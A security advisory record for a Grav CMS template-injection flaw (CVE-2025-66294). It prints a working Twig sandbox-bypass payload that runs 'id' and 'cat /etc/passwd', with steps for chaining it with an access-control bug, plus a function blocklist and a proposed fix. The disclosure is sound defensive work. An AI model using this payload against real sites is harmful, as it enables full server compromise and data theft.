@@ -1,0 +1,512 @@
+advisory_id: GHSA-662m-56v4-3r8f
+datasource_id: github_osv/GHSA-662m-56v4-3r8f
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-662m-56v4-3r8f/GHSA-662m-56v4-3r8f.json
+aliases:
+  - CVE-2025-66294
+summary: "Grav is vulnerable to RCE via SSTI through Twig Sandbox Bypass\n### Summary\nA Server-Side\
+  \ Template Injection (SSTI) vulnerability exists in Grav that allows authenticated attackers\
+  \ with editor permissions to execute arbitrary commands on the server and, under certain conditions,\
+  \ may also be exploited by unauthenticated attackers. This vulnerability stems from weak regex\
+  \ validation in the `cleanDangerousTwig` method.\n\n### Important\n- First of all this vulnerability\
+  \ is due to weak sanitization in the method `clearDangerousTwig`, so any other class that\
+  \ calls it indirectly through for example `$twig->processString` to sanitize code is also\
+  \ vulnerable.\n\n- For this report, we will need the official Form and Admin plugin installed,\
+  \ also I will be chaining this with another vulnerability to allow an editor which is a user\
+  \ with only pages permissions to edit the process section of a form.\n\n- I made another report\
+  \ for the other vulnerability which is a Broken Access Control which allows a user with full\
+  \ permission for pages to change the process section by intercepting the request and modifying\
+  \ it.\n\n### Permissions Needed\n- The main case for this vulnerability is an editor which\
+  \ can unconditionally takeover the whole system through creating a vulnerable form.\n- Second\
+  \ case is as an unauthenticated user, so if the form exists already and accepts user input\
+  \ and puts it through `evaluate_twig`, a guest can takeover the system.\n\n### Details\nWhen\
+  \ we make a form with a process section and a `message` action, when the form is submitted\
+  \ we get to deal with `onFormProcess` in `form.php` through the `message` case:\n\n```php\n\
+  \            case 'message':\n                $translated_string = $this->grav['language']->translate($params);\n\
+  \                $vars = array(\n                    'form' => $form\n                );\n\
+  \n                /** @var Twig $twig */\n                $twig = $this->grav['twig'];\n \
+  \               $processed_string = $twig->processString($translated_string, $vars);\n\n \
+  \               $form->message = $processed_string;\n                break;\n```\n\nWhich\
+  \ takes our parameters as in our action values, like in our case the value of our `message`\
+  \ action and sends it to `processString` which then calls the method `cleanDangerousTwig`\
+  \ from `Security.php`, now here's where we find the vulnerability is caused by two things:\n\
+  \n- First of all is weak regex which doesn't account for nested function calls, which allows\
+  \ us to bypass this function's sanitization\n- Second issue which is the `evaluate` and `evaluate_twig`\
+  \ functions which are allowed, and since we can call Twig syntax from inside them, it will\
+  \ lead to nested function calls which we can bypass and thus execute arbitrary payloads.\n\
+  \n```php\n    public static function cleanDangerousTwig(string $string): string\n    {\n \
+  \       if ($string === '') {\n            return $string;\n        }\n\n        $bad_twig\
+  \ = [\n            'twig_array_map',\n            'twig_array_filter',\n            'call_user_func',\n\
+  \            'registerUndefinedFunctionCallback',\n            'undefined_functions',\n  \
+  \          'twig.getFunction',\n            'core.setEscaper',\n            'twig.safe_functions',\n\
+  \            'read_file',\n        ];\n         \n        // This allows for a payload like\
+  \ {{ evaluate(\"read_file('/etc/passwd')\") }}\n        $string = preg_replace('/(({{\\s*|{%\\\
+  s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\
+  \        return $string;\n    }\n```\n\n### PoC\n\nFirst to showcase how the function handles\
+  \ the payload, I built a small php program that replicates the behavior of `cleanDangerousTwig`:\n\
+  \n```php\n<?php\n\nfunction cleanDangerousTwig(string $string): string\n{\n    if ($string\
+  \ === '') {\n        return $string;\n    }\n\n    $bad_twig = [\n        'twig_array_map',\n\
+  \        'twig_array_filter',\n        'call_user_func',\n        'registerUndefinedFunctionCallback',\n\
+  \        'undefined_functions',\n        'twig.getFunction',\n        'core.setEscaper',\n\
+  \        'twig.safe_functions',\n        'read_file',\n    ];\n    $string = preg_replace('/(({{\\\
+  s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\
+  \n    return $string;\n}\n\n$x = $argv[1];\necho cleanDangerousTwig(\"evaluate_twig('$x')\"\
+  );\n```\n\nWe can run the program with this payload:\n\n```bash\nphp ok.php \"{{ grav.twig.twig.registerUndefinedFunctionCallback('system')\
+  \ }} {% set a = grav.config.set('system.twig.undefined_functions',false) %} {{ grav.twig.twig.getFunction('cat\
+  \ /etc/passwd') }}\"\n```\n\nOur payload goes through and not one malicious function is filtered:\n\
+  \n```\nevaluate_twig('{# {{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}\
+  \ #} {# {% set a = grav.config.set('system.twig.undefined_functions',false) %} #} {# {{ grav.twig.twig.getFunction('cat\
+  \ /etc/passwd') }} #}')\n```\n\nNow we know that our payload definitely works so let's try\
+  \ it through a custom form this time, as an editor:\n\n- Go to pages\n- Add a page and create\
+  \ a new form or choose an exiting one\n\nWe will be using another vulnerability I found which\
+  \ is a Broken Access Control vulnerability, which allows an editor with basically only pages\
+  \ rights to modify a form's action sections without being in expert mode ( please refer to\
+  \ [it's report](https://github.com/getgrav/grav/security/advisories/GHSA-v8x2-fjv7-8hjh) ),\
+  \ so when we go to our form and save it, we can intercept the request and inject the following\
+  \ payload into `data[_json][header][form]` which is the header for our form which we shouldn't\
+  \ normally be able to modify:\n\n```\n{\"name\":\"ssti-test 2\",\"fields\":{\"name\":{\"type\"\
+  :\"text\",\"label\":\"Name\",\"required\":true}},\"buttons\":{\"submit\":{\"type\":\"submit\"\
+  ,\"value\":\"Submit\"}},\"process\":[]}\n```\n\nURL-encode it before sending it should look\
+  \ something like this:\n\n![image](https://github.com/user-attachments/assets/c3345f1f-c613-4534-a15c-bd1cf7e4b2f5)\n\
+  \n![image](https://github.com/user-attachments/assets/e9685357-b85d-432a-842b-27a28487b7d1)\n\
+  \nRequest sent and processed! Now when you go to our form file you can see added a process\
+  \ section with the value of message changed:\n\n![image](https://github.com/user-attachments/assets/c87bdc3b-712c-465f-bd0d-9951ca826a6a)\n\
+  \nContent of form:\n\n```\ntitle: Home\nprocess:\n    markdown: true\n    twig: true\nform:\n\
+  \    name: test\n    fields:\n        name:\n            type: text\n            label: Name\n\
+  \            required: true\n    buttons:\n        submit:\n            type: submit\n   \
+  \         value: submit\n    process:\n        -\n            message: '{{ evaluate_twig(form.value(''name''))\
+  \ }}'\n```\n\nNow in the process section, notice our message action is gonna take value from\
+  \ the Name input, using the following payload we will execute the command `id` on the system:\n\
+  \n```\n{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }} {% set a = grav.config.set('system.twig.undefined_functions',false)\
+  \ %} {{ grav.twig.twig.getFunction('id') }}\n```\n\nNow we can visit the page and input our\
+  \ payload, submit and we got command result:\n\n![image](https://github.com/user-attachments/assets/46571c3c-53ad-4028-b607-8c8f1c26b0c2)\n\
+  \n\n### Impact\n\nAllows an attacker to execute arbitrary commands, leading to full system\
+  \ compromise, including unauthorized access, data theft, privilege escalation, and disruption\
+  \ of services.\n\n### Recommended Fix\n\n- Blacklist both the `evaluate` and `evaluate_twig`\
+  \ functions.\n- We could add second check to `cleanDangerousTwig` where we would look for\
+  \ each malicious function no matter it's position:\n\n```php\n<?php\n\nfunction cleanDangerousTwig(string\
+  \ $string): string\n{\n    if ($string === '') {\n        return $string;\n    }\n\n    $bad_twig\
+  \ = [\n        'twig_array_map',\n        'twig_array_filter',\n        'call_user_func',\n\
+  \        'registerUndefinedFunctionCallback',\n        'undefined_functions',\n        'twig.getFunction',\n\
+  \        'core.setEscaper',\n        'twig.safe_functions',\n        'read_file',\n    ];\n\
+  \    $string = preg_replace('/(({{\\s*|{%\\s*)[^}]*?(' . implode('|', $bad_twig) . ')[^}]*?(\\\
+  s*}}|\\s*%}))/i', '{# $1 #}', $string);\n\n    foreach ($bad_twig as $func) {\n        $string\
+  \ = preg_replace('/\\b' . preg_quote($func, '/') . '(\\s*\\([^)]*\\))?\\b/i', '{# $1 #}',\
+  \ $string);\n    }\n\n    return $string;\n}\n\n$x = $argv[1];\necho cleanDangerousTwig(\"\
+  evaluate_twig('$x')\");\n```\n\nWhen we run this, the result is:\n```\nevaluate_twig('{# {{\
+  \ grav.twig.twig.{#  #}('system') }} #} {# {% set a = grav.config.set('system.twig.{#  #}',false)\
+  \ %} #} {# {{ grav.twig.{#  #}('cat /etc/passwd') }} #}')\n```\nYou can see we managed to\
+  \ stop the payload and filter out the malicious functions."
+impacted_packages:
+  - purl: pkg:composer/getgrav/grav
+    affected_versions: vers:composer/<1.8.0-beta.27
+    fixed_versions: vers:composer/1.8.0-beta.27
+    affected_packages:
+      - pkg:composer/getgrav/grav@0.8.0
+      - pkg:composer/getgrav/grav@0.9.0
+      - pkg:composer/getgrav/grav@0.9.1
+      - pkg:composer/getgrav/grav@0.9.2
+      - pkg:composer/getgrav/grav@0.9.3
+      - pkg:composer/getgrav/grav@0.9.4
+      - pkg:composer/getgrav/grav@0.9.5
+      - pkg:composer/getgrav/grav@0.9.6
+      - pkg:composer/getgrav/grav@0.9.7
+      - pkg:composer/getgrav/grav@0.9.8
+      - pkg:composer/getgrav/grav@0.9.9
+      - pkg:composer/getgrav/grav@0.9.10
+      - pkg:composer/getgrav/grav@0.9.11
+      - pkg:composer/getgrav/grav@0.9.12
+      - pkg:composer/getgrav/grav@0.9.13
+      - pkg:composer/getgrav/grav@0.9.14
+      - pkg:composer/getgrav/grav@0.9.15
+      - pkg:composer/getgrav/grav@0.9.16
+      - pkg:composer/getgrav/grav@0.9.17
+      - pkg:composer/getgrav/grav@0.9.18
+      - pkg:composer/getgrav/grav@0.9.19
+      - pkg:composer/getgrav/grav@0.9.20
+      - pkg:composer/getgrav/grav@0.9.21
+      - pkg:composer/getgrav/grav@0.9.22
+      - pkg:composer/getgrav/grav@0.9.23
+      - pkg:composer/getgrav/grav@0.9.24
+      - pkg:composer/getgrav/grav@0.9.25
+      - pkg:composer/getgrav/grav@0.9.26
+      - pkg:composer/getgrav/grav@0.9.27
+      - pkg:composer/getgrav/grav@0.9.28
+      - pkg:composer/getgrav/grav@0.9.29
+      - pkg:composer/getgrav/grav@0.9.30
+      - pkg:composer/getgrav/grav@0.9.31
+      - pkg:composer/getgrav/grav@0.9.32
+      - pkg:composer/getgrav/grav@0.9.33
+      - pkg:composer/getgrav/grav@0.9.34
+      - pkg:composer/getgrav/grav@0.9.35
+      - pkg:composer/getgrav/grav@0.9.36
+      - pkg:composer/getgrav/grav@0.9.37
+      - pkg:composer/getgrav/grav@0.9.38
+      - pkg:composer/getgrav/grav@0.9.39
+      - pkg:composer/getgrav/grav@0.9.40
+      - pkg:composer/getgrav/grav@0.9.41
+      - pkg:composer/getgrav/grav@0.9.42
+      - pkg:composer/getgrav/grav@0.9.43
+      - pkg:composer/getgrav/grav@0.9.44
+      - pkg:composer/getgrav/grav@0.9.45
+      - pkg:composer/getgrav/grav@1.0.0-rc.1
+      - pkg:composer/getgrav/grav@1.0.0-rc.2
+      - pkg:composer/getgrav/grav@1.0.0-rc.3
+      - pkg:composer/getgrav/grav@1.0.0-rc.4
+      - pkg:composer/getgrav/grav@1.0.0-rc.5
+      - pkg:composer/getgrav/grav@1.0.0-rc.6
+      - pkg:composer/getgrav/grav@1.0.0
+      - pkg:composer/getgrav/grav@1.0.1
+      - pkg:composer/getgrav/grav@1.0.2
+      - pkg:composer/getgrav/grav@1.0.3
+      - pkg:composer/getgrav/grav@1.0.4
+      - pkg:composer/getgrav/grav@1.0.5
+      - pkg:composer/getgrav/grav@1.0.6
+      - pkg:composer/getgrav/grav@1.0.7
+      - pkg:composer/getgrav/grav@1.0.8
+      - pkg:composer/getgrav/grav@1.0.9
+      - pkg:composer/getgrav/grav@1.0.10
+      - pkg:composer/getgrav/grav@1.1.0-beta.1
+      - pkg:composer/getgrav/grav@1.1.0-beta.2
+      - pkg:composer/getgrav/grav@1.1.0-beta.3
+      - pkg:composer/getgrav/grav@1.1.0-beta.4
+      - pkg:composer/getgrav/grav@1.1.0-beta.5
+      - pkg:composer/getgrav/grav@1.1.0-rc.1
+      - pkg:composer/getgrav/grav@1.1.0-rc.2
+      - pkg:composer/getgrav/grav@1.1.0-rc.3
+      - pkg:composer/getgrav/grav@1.1.0
+      - pkg:composer/getgrav/grav@1.1.1
+      - pkg:composer/getgrav/grav@1.1.2
+      - pkg:composer/getgrav/grav@1.1.3
+      - pkg:composer/getgrav/grav@1.1.4
+      - pkg:composer/getgrav/grav@1.1.5
+      - pkg:composer/getgrav/grav@1.1.6
+      - pkg:composer/getgrav/grav@1.1.7
+      - pkg:composer/getgrav/grav@1.1.8
+      - pkg:composer/getgrav/grav@1.1.9-rc.1
+      - pkg:composer/getgrav/grav@1.1.9-rc.2
+      - pkg:composer/getgrav/grav@1.1.9-rc.3
+      - pkg:composer/getgrav/grav@1.1.9
+      - pkg:composer/getgrav/grav@1.1.10
+      - pkg:composer/getgrav/grav@1.1.11
+      - pkg:composer/getgrav/grav@1.1.12
+      - pkg:composer/getgrav/grav@1.1.13
+      - pkg:composer/getgrav/grav@1.1.14
+      - pkg:composer/getgrav/grav@1.1.15
+      - pkg:composer/getgrav/grav@1.1.16
+      - pkg:composer/getgrav/grav@1.1.17
+      - pkg:composer/getgrav/grav@1.2.0-rc.1
+      - pkg:composer/getgrav/grav@1.2.0-rc.2
+      - pkg:composer/getgrav/grav@1.2.0-rc.3
+      - pkg:composer/getgrav/grav@1.2.0
+      - pkg:composer/getgrav/grav@1.2.1
+      - pkg:composer/getgrav/grav@1.2.2
+      - pkg:composer/getgrav/grav@1.2.3
+      - pkg:composer/getgrav/grav@1.2.4
+      - pkg:composer/getgrav/grav@1.3.0-rc.1
+      - pkg:composer/getgrav/grav@1.3.0-rc.2
+      - pkg:composer/getgrav/grav@1.3.0-rc.3
+      - pkg:composer/getgrav/grav@1.3.0-rc.4
+      - pkg:composer/getgrav/grav@1.3.0-rc.5
+      - pkg:composer/getgrav/grav@1.3.0
+      - pkg:composer/getgrav/grav@1.3.1
+      - pkg:composer/getgrav/grav@1.3.2
+      - pkg:composer/getgrav/grav@1.3.3
+      - pkg:composer/getgrav/grav@1.3.4
+      - pkg:composer/getgrav/grav@1.3.5
+      - pkg:composer/getgrav/grav@1.3.6
+      - pkg:composer/getgrav/grav@1.3.7
+      - pkg:composer/getgrav/grav@1.3.8
+      - pkg:composer/getgrav/grav@1.3.9
+      - pkg:composer/getgrav/grav@1.3.10
+      - pkg:composer/getgrav/grav@1.4.0-beta.1
+      - pkg:composer/getgrav/grav@1.4.0-beta.2
+      - pkg:composer/getgrav/grav@1.4.0-beta.3
+      - pkg:composer/getgrav/grav@1.4.0-rc.1
+      - pkg:composer/getgrav/grav@1.4.0-rc.2
+      - pkg:composer/getgrav/grav@1.4.0
+      - pkg:composer/getgrav/grav@1.4.1
+      - pkg:composer/getgrav/grav@1.4.2
+      - pkg:composer/getgrav/grav@1.4.3
+      - pkg:composer/getgrav/grav@1.4.4
+      - pkg:composer/getgrav/grav@1.4.5
+      - pkg:composer/getgrav/grav@1.4.6
+      - pkg:composer/getgrav/grav@1.4.7
+      - pkg:composer/getgrav/grav@1.4.8
+      - pkg:composer/getgrav/grav@1.5.0-beta.1
+      - pkg:composer/getgrav/grav@1.5.0-beta.2
+      - pkg:composer/getgrav/grav@1.5.0-rc.1
+      - pkg:composer/getgrav/grav@1.5.0
+      - pkg:composer/getgrav/grav@1.5.1
+      - pkg:composer/getgrav/grav@1.5.2
+      - pkg:composer/getgrav/grav@1.5.3
+      - pkg:composer/getgrav/grav@1.5.4
+      - pkg:composer/getgrav/grav@1.5.5
+      - pkg:composer/getgrav/grav@1.5.6
+      - pkg:composer/getgrav/grav@1.5.7
+      - pkg:composer/getgrav/grav@1.5.8
+      - pkg:composer/getgrav/grav@1.5.9
+      - pkg:composer/getgrav/grav@1.5.10
+      - pkg:composer/getgrav/grav@1.6.0-beta.1
+      - pkg:composer/getgrav/grav@1.6.0-beta.2
+      - pkg:composer/getgrav/grav@1.6.0-beta.3
+      - pkg:composer/getgrav/grav@1.6.0-beta.4
+      - pkg:composer/getgrav/grav@1.6.0-beta.5
+      - pkg:composer/getgrav/grav@1.6.0-beta.6
+      - pkg:composer/getgrav/grav@1.6.0-beta.7
+      - pkg:composer/getgrav/grav@1.6.0-beta.8
+      - pkg:composer/getgrav/grav@1.6.0-rc.1
+      - pkg:composer/getgrav/grav@1.6.0-rc.2
+      - pkg:composer/getgrav/grav@1.6.0-rc.3
+      - pkg:composer/getgrav/grav@1.6.0-rc.4
+      - pkg:composer/getgrav/grav@1.6.0
+      - pkg:composer/getgrav/grav@1.6.1
+      - pkg:composer/getgrav/grav@1.6.2
+      - pkg:composer/getgrav/grav@1.6.3
+      - pkg:composer/getgrav/grav@1.6.4
+      - pkg:composer/getgrav/grav@1.6.5
+      - pkg:composer/getgrav/grav@1.6.6
+      - pkg:composer/getgrav/grav@1.6.7
+      - pkg:composer/getgrav/grav@1.6.8
+      - pkg:composer/getgrav/grav@1.6.9
+      - pkg:composer/getgrav/grav@1.6.10
+      - pkg:composer/getgrav/grav@1.6.11
+      - pkg:composer/getgrav/grav@1.6.12
+      - pkg:composer/getgrav/grav@1.6.13
+      - pkg:composer/getgrav/grav@1.6.14
+      - pkg:composer/getgrav/grav@1.6.15
+      - pkg:composer/getgrav/grav@1.6.16
+      - pkg:composer/getgrav/grav@1.6.17
+      - pkg:composer/getgrav/grav@1.6.18
+      - pkg:composer/getgrav/grav@1.6.19
+      - pkg:composer/getgrav/grav@1.6.20
+      - pkg:composer/getgrav/grav@1.6.21
+      - pkg:composer/getgrav/grav@1.6.22
+      - pkg:composer/getgrav/grav@1.6.23
+      - pkg:composer/getgrav/grav@1.6.24
+      - pkg:composer/getgrav/grav@1.6.25
+      - pkg:composer/getgrav/grav@1.6.26
+      - pkg:composer/getgrav/grav@1.6.27
+      - pkg:composer/getgrav/grav@1.6.28
+      - pkg:composer/getgrav/grav@1.6.29
+      - pkg:composer/getgrav/grav@1.6.30
+      - pkg:composer/getgrav/grav@1.6.31
+      - pkg:composer/getgrav/grav@1.7.0-beta.1
+      - pkg:composer/getgrav/grav@1.7.0-beta.2
+      - pkg:composer/getgrav/grav@1.7.0-beta.3
+      - pkg:composer/getgrav/grav@1.7.0-beta.4
+      - pkg:composer/getgrav/grav@1.7.0-beta.5
+      - pkg:composer/getgrav/grav@1.7.0-beta.6
+      - pkg:composer/getgrav/grav@1.7.0-beta.7
+      - pkg:composer/getgrav/grav@1.7.0-beta.8
+      - pkg:composer/getgrav/grav@1.7.0-beta.9
+      - pkg:composer/getgrav/grav@1.7.0-beta.10
+      - pkg:composer/getgrav/grav@1.7.0-rc.1
+      - pkg:composer/getgrav/grav@1.7.0-rc.2
+      - pkg:composer/getgrav/grav@1.7.0-rc.3
+      - pkg:composer/getgrav/grav@1.7.0-rc.4
+      - pkg:composer/getgrav/grav@1.7.0-rc.5
+      - pkg:composer/getgrav/grav@1.7.0-rc.6
+      - pkg:composer/getgrav/grav@1.7.0-rc.7
+      - pkg:composer/getgrav/grav@1.7.0-rc.8
+      - pkg:composer/getgrav/grav@1.7.0-rc.9
+      - pkg:composer/getgrav/grav@1.7.0-rc.10
+      - pkg:composer/getgrav/grav@1.7.0-rc.11
+      - pkg:composer/getgrav/grav@1.7.0-rc.12
+      - pkg:composer/getgrav/grav@1.7.0-rc.13
+      - pkg:composer/getgrav/grav@1.7.0-rc.14
+      - pkg:composer/getgrav/grav@1.7.0-rc.15
+      - pkg:composer/getgrav/grav@1.7.0-rc.16
+      - pkg:composer/getgrav/grav@1.7.0-rc.17
+      - pkg:composer/getgrav/grav@1.7.0-rc.18
+      - pkg:composer/getgrav/grav@1.7.0-rc.19
+      - pkg:composer/getgrav/grav@1.7.0-rc.20
+      - pkg:composer/getgrav/grav@1.7.0
+      - pkg:composer/getgrav/grav@1.7.1
+      - pkg:composer/getgrav/grav@1.7.3
+      - pkg:composer/getgrav/grav@1.7.4
+      - pkg:composer/getgrav/grav@1.7.5
+      - pkg:composer/getgrav/grav@1.7.6
+      - pkg:composer/getgrav/grav@1.7.7
+      - pkg:composer/getgrav/grav@1.7.8
+      - pkg:composer/getgrav/grav@1.7.9
+      - pkg:composer/getgrav/grav@1.7.10
+      - pkg:composer/getgrav/grav@1.7.12
+      - pkg:composer/getgrav/grav@1.7.13
+      - pkg:composer/getgrav/grav@1.7.14
+      - pkg:composer/getgrav/grav@1.7.15
+      - pkg:composer/getgrav/grav@1.7.16
+      - pkg:composer/getgrav/grav@1.7.17
+      - pkg:composer/getgrav/grav@1.7.18
+      - pkg:composer/getgrav/grav@1.7.19
+      - pkg:composer/getgrav/grav@1.7.20
+      - pkg:composer/getgrav/grav@1.7.21
+      - pkg:composer/getgrav/grav@1.7.22
+      - pkg:composer/getgrav/grav@1.7.23
+      - pkg:composer/getgrav/grav@1.7.24
+      - pkg:composer/getgrav/grav@1.7.25
+      - pkg:composer/getgrav/grav@1.7.26
+      - pkg:composer/getgrav/grav@1.7.26%2B1
+      - pkg:composer/getgrav/grav@1.7.27
+      - pkg:composer/getgrav/grav@1.7.27%2B1
+      - pkg:composer/getgrav/grav@1.7.28
+      - pkg:composer/getgrav/grav@1.7.29
+      - pkg:composer/getgrav/grav@1.7.29%2B1
+      - pkg:composer/getgrav/grav@1.7.30
+      - pkg:composer/getgrav/grav@1.7.31
+      - pkg:composer/getgrav/grav@1.7.32
+      - pkg:composer/getgrav/grav@1.7.33
+      - pkg:composer/getgrav/grav@1.7.34
+      - pkg:composer/getgrav/grav@1.7.35
+      - pkg:composer/getgrav/grav@1.7.36
+      - pkg:composer/getgrav/grav@1.7.37
+      - pkg:composer/getgrav/grav@1.7.37%2B1
+      - pkg:composer/getgrav/grav@1.7.38
+      - pkg:composer/getgrav/grav@1.7.39
+      - pkg:composer/getgrav/grav@1.7.39%2B1
+      - pkg:composer/getgrav/grav@1.7.39%2B2
+      - pkg:composer/getgrav/grav@1.7.39%2B3
+      - pkg:composer/getgrav/grav@1.7.39%2B4
+      - pkg:composer/getgrav/grav@1.7.40
+      - pkg:composer/getgrav/grav@1.7.41
+      - pkg:composer/getgrav/grav@1.7.41%2B1
+      - pkg:composer/getgrav/grav@1.7.41%2B2
+      - pkg:composer/getgrav/grav@1.7.42
+      - pkg:composer/getgrav/grav@1.7.42%2B1
+      - pkg:composer/getgrav/grav@1.7.42%2B2
+      - pkg:composer/getgrav/grav@1.7.42%2B3
+      - pkg:composer/getgrav/grav@1.7.43
+      - pkg:composer/getgrav/grav@1.7.44
+      - pkg:composer/getgrav/grav@1.7.45
+      - pkg:composer/getgrav/grav@1.7.46
+      - pkg:composer/getgrav/grav@1.7.47
+      - pkg:composer/getgrav/grav@1.7.48
+      - pkg:composer/getgrav/grav@1.7.49
+      - pkg:composer/getgrav/grav@1.7.49%2B1
+      - pkg:composer/getgrav/grav@1.7.49%2B2
+      - pkg:composer/getgrav/grav@1.7.49%2B3
+      - pkg:composer/getgrav/grav@1.7.49%2B4
+      - pkg:composer/getgrav/grav@1.7.49%2B5
+      - pkg:composer/getgrav/grav@1.7.51
+      - pkg:composer/getgrav/grav@1.7.52
+      - pkg:composer/getgrav/grav@1.7.53
+      - pkg:composer/getgrav/grav@1.7.53%2B1
+      - pkg:composer/getgrav/grav@1.7.53%2B2
+      - pkg:composer/getgrav/grav@1.7.53%2B3
+      - pkg:composer/getgrav/grav@1.8.0-beta.1
+      - pkg:composer/getgrav/grav@1.8.0-beta.2
+      - pkg:composer/getgrav/grav@1.8.0-beta.3
+      - pkg:composer/getgrav/grav@1.8.0-beta.4
+      - pkg:composer/getgrav/grav@1.8.0-beta.5
+      - pkg:composer/getgrav/grav@1.8.0-beta.6
+      - pkg:composer/getgrav/grav@1.8.0-beta.7
+      - pkg:composer/getgrav/grav@1.8.0-beta.8
+      - pkg:composer/getgrav/grav@1.8.0-beta.9
+      - pkg:composer/getgrav/grav@1.8.0-beta.10
+      - pkg:composer/getgrav/grav@1.8.0-beta.11
+      - pkg:composer/getgrav/grav@1.8.0-beta.12
+      - pkg:composer/getgrav/grav@1.8.0-beta.13
+      - pkg:composer/getgrav/grav@1.8.0-beta.14
+      - pkg:composer/getgrav/grav@1.8.0-beta.15
+      - pkg:composer/getgrav/grav@1.8.0-beta.16
+      - pkg:composer/getgrav/grav@1.8.0-beta.17
+      - pkg:composer/getgrav/grav@1.8.0-beta.18
+      - pkg:composer/getgrav/grav@1.8.0-beta.19
+      - pkg:composer/getgrav/grav@1.8.0-beta.20
+      - pkg:composer/getgrav/grav@1.8.0-beta.21
+      - pkg:composer/getgrav/grav@1.8.0-beta.22
+      - pkg:composer/getgrav/grav@1.8.0-beta.23
+      - pkg:composer/getgrav/grav@1.8.0-beta.24
+      - pkg:composer/getgrav/grav@1.8.0-beta.25
+      - pkg:composer/getgrav/grav@1.8.0-beta.26
+    fixed_packages:
+      - pkg:composer/getgrav/grav@1.8.0-beta.27
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/getgrav/grav
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/getgrav/grav
+        commit: e37259527d9c1deb6200f8967197a9fa587c6458
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-662m-56v4-3r8f/GHSA-662m-56v4-3r8f.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-94
+  - CWE-1336
+references:
+  - url: https://github.com/getgrav/grav
+    reference_type:
+    reference_id:
+  - url: https://github.com/getgrav/grav/commit/e37259527d9c1deb6200f8967197a9fa587c6458
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-66294
+    reference_type:
+    reference_id: CVE-2025-66294
+  - url: https://github.com/getgrav/grav/security/advisories/GHSA-662m-56v4-3r8f
+    reference_type:
+    reference_id: GHSA-662m-56v4-3r8f
+exploits:
+  - description: |
+      This module exploits a Server-Side Template Injection (SSTI)
+                vulnerability (CVE-2025-66294) in Grav CMS that allows bypassing the
+                Twig sandbox to achieve remote code execution. The cleanDangerousTwig
+                method uses weak regex that fails to sanitize nested Twig calls within
+                the evaluate_twig function. To inject the payload, this module leverages
+                CVE-2025-66301, a broken access control flaw that allows users with page
+                editing privileges to modify the form's YAML frontmatter process section.
+    required_action:
+    due_date:
+    notes: |
+      Stability:
+        - crash-safe
+      Reliability:
+        - repeatable-session
+      SideEffects:
+        - ioc-in-logs
+    known_ransomware_campaign_use: no
+    source_date_published: !!timestamp '2025-12-01'
+    exploit_type:
+    platform: Linux,Unix,Windows
+    source_date_updated:
+    data_source: Metasploit
+    source_url: https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http/grav_twig_ssti_sandbox_bypass_rce.rb
+    record_id:
+  - description: |
+      This module exploits a Server-Side Template Injection (SSTI)
+                vulnerability (CVE-2025-66294) in Grav CMS that allows bypassing the
+                Twig sandbox to achieve remote code execution. The cleanDangerousTwig
+                method uses weak regex that fails to sanitize nested Twig calls within
+                the evaluate_twig function. To inject the payload, this module leverages
+                CVE-2025-66301, a broken access control flaw that allows users with page
+                editing privileges to modify the form's YAML frontmatter process section.
+    required_action:
+    due_date:
+    notes: |
+      Stability:
+        - crash-safe
+      Reliability:
+        - repeatable-session
+      SideEffects:
+        - ioc-in-logs
+    known_ransomware_campaign_use: no
+    source_date_published: !!timestamp '2025-12-01'
+    exploit_type:
+    platform: Linux,Unix,Windows
+    source_date_updated:
+    data_source: Metasploit
+    source_url: https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/multi/http/grav_twig_ssti_sandbox_bypass_rce.rb
+    record_id: /modules/exploits/multi/http/grav_twig_ssti_sandbox_bypass_rce.rb
